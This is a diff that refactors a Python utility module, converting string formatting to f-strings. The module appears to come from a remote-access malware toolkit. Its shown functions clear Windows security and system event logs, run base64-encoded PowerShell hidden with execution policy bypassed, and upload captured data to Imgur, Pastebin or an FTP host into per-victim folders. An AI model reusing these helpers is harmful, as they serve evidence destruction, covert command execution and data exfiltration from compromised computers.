@@ -41,9 +41,9 @@ def imports(source, target=None):
         module = globals()
     for src in source:
         try:
-            exec("import {}".format(src), target)
+            exec(f"import {src}", target)
         except ImportError:
-            log("missing package '{}' is required".format(source))
+            log(f"missing package '{source}' is required")
 
 
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
@@ -58,7 +58,11 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     import sys
     if sys.platform in platforms:
         return True
-    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
+    log(
+        f"module {module or ''} is not yet compatible with {sys.platform} platforms",
+        level='warn',
+    )
+
     return False
 
 
@@ -183,10 +187,17 @@ def status(timestamp):
     """
     import time
     c = time.time() - float(timestamp)
-    data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
-          '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
-          '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
-          '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
+    data = [
+        f'{int(c / 86400.0)} days' if int(c / 86400.0) else str(),
+        f'{int(c % 86400.0 / 3600.0)} hours'
+        if int((c % 86400.0) / 3600.0)
+        else str(),
+        f'{int(c % 3600.0 / 60.0)} minutes'
+        if int((c % 3600.0) / 60.0)
+        else str(),
+        f'{int(c % 60.0)} seconds' if int(c % 60.0) else str(),
+    ]
+
     return ', '.join([i for i in data if i])
 
 
@@ -319,7 +330,7 @@ def png(image):
         width, height = (image.width, image.height)
         data = image.rgb
     else:
-        raise TypeError("invalid input type: {}".format(type(image)))
+        raise TypeError(f"invalid input type: {type(image)}")
 
     line = width * 3
     png_filter = struct.pack('>B', 0)
@@ -362,7 +373,12 @@ def delete(target):
     import os
     import shutil
     try:
-        _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
+        _ = (
+            os.popen(f'attrib -h -r -s {target}')
+            if os.name == 'nt'
+            else os.chmod(target, 777)
+        )
+
     except OSError: pass
     try:
         if os.path.isfile(target):
@@ -380,8 +396,10 @@ def clear_system_logs():
     """
     try:
         for log in ["application","security","setup","system"]:
-            output = powershell("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
-            if output:
+            if output := powershell(
+                "& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"
+                % log
+            ):
                 log(output)
     except Exception as e:
         log(e)
@@ -417,9 +435,12 @@ def powershell(code):
     import base64
     try:
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
-        return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
+        return os.popen(
+            f'{powershell} -exec bypass -window hidden -noni -nop -encoded {base64.b64encode(code)}'
+        ).read()
+
     except Exception as e:
-        log("{} error: {}".format(powershell.__name__, str(e)))
+        log(f"{powershell.__name__} error: {str(e)}")
 
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
@@ -460,7 +481,7 @@ def color():
         import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
-        log("{} error: {}".format(color.__name__, str(e)))
+        log(f"{color.__name__} error: {str(e)}")
 
 
 def imgur(source, api_key=None):
@@ -470,7 +491,16 @@ def imgur(source, api_key=None):
     """
     import base64
     if api_key:
-        response = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(source)), 'type': 'base64'}, as_json=True)
+        response = post(
+            'https://api.imgur.com/3/upload',
+            headers={'Authorization': f'Client-ID {api_key}'},
+            data={
+                'image': base64.b64encode(normalize(source)),
+                'type': 'base64',
+            },
+            as_json=True,
+        )
+
         return response['data']['link'].encode()
     else:
         log("No Imgur API key found")
@@ -500,12 +530,25 @@ def pastebin(source, api_key):
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
             parts = urlsplit(paste)
-            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            result = (
+                urlunsplit(
+                    (
+                        parts.scheme,
+                        parts.netloc,
+                        f'/raw{parts.path}',
+                        parts.query,
+                        parts.fragment,
+                    )
+                )
+                if paste.startswith('http')
+                else paste
+            )
+
             if not result.endswith('/'):
                 result += '/'
             return result
         except Exception as e:
-            log("Upload to Pastebin failed with error: {}".format(e))
+            log(f"Upload to Pastebin failed with error: {e}")
     else:
         log("No Pastebin API key found")
 
@@ -551,13 +594,18 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         if 'tmp' not in ftp.nlst():
             ftp.mkd('/tmp')
         if addr not in ftp.nlst('/tmp'):
-            ftp.mkd('/tmp/{}'.format(addr))
+            ftp.mkd(f'/tmp/{addr}')
         if path:
-            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
+            path = f'/tmp/{addr}/{os.path.basename(path)}'
         else:
-            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
-            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
-        stor = ftp.storbinary('STOR ' + path, source)
+            filetype = (
+                str(filetype)
+                if str(filetype).startswith('.')
+                else f'.{str(filetype)}'
+            )
+
+            path = f'/tmp/{addr}/{local[1]}-{local[2]}_{local[3]}{filetype}'
+        stor = ftp.storbinary(f'STOR {path}', source)
         return path
     else:
         log('missing one or more required arguments: host, user, password')
